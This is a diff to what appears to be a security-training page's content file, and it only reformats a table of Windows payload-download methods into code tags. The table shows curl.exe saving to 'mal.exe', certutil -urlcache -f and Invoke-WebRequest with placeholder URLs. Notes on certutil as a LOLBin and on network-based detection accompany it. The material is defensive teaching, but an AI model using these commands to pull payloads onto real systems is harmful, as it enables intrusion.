@@ -74,9 +74,9 @@ export default {
       blocks: [
         { t: "table", head: ["Method", "Command shape"], rows: [
           ["Web browser", "navigate directly to the URL"],
-          ["curl.exe", "curl.exe <url> -o mal.exe"],
-          ["certutil.exe", "certutil.exe -urlcache -f <url> <outfile>"],
-          ["PowerShell", "Invoke-WebRequest '<url>' -OutFile <file>"],
+          ["curl.exe", "<code>curl.exe &lt;url&gt; -o mal.exe</code>"],
+          ["certutil.exe", "<code>certutil.exe -urlcache -f &lt;url&gt; &lt;outfile&gt;</code>"],
+          ["PowerShell", "<code>Invoke-WebRequest '&lt;url&gt;' -OutFile &lt;file&gt;</code>"],
         ]},
         { t: "note", kind: "danger", title: "certutil — a genuine LOLBin", text: "A legitimate, signed, built-in cert-management utility with no obvious reason to touch the network — its -urlcache -f flags fetch a URL anyway. A signed Microsoft binary making an outbound HTTP request reads as far less suspicious than an unrecognized .exe doing the same. Keep it on a watchlist of \"binaries with no legitimate reason to make HTTP requests\" (rundll32, mshta, same category)." },
         { t: "note", kind: "info", title: "detecting it", text: "Track network connections/DNS requests from a suspicious process, then correlate: which process made the connection, the destination domain, and the file that landed on disk. Attackers often host payloads on legitimate services (GitHub) specifically to blend in — domain reputation alone isn't reliable." },
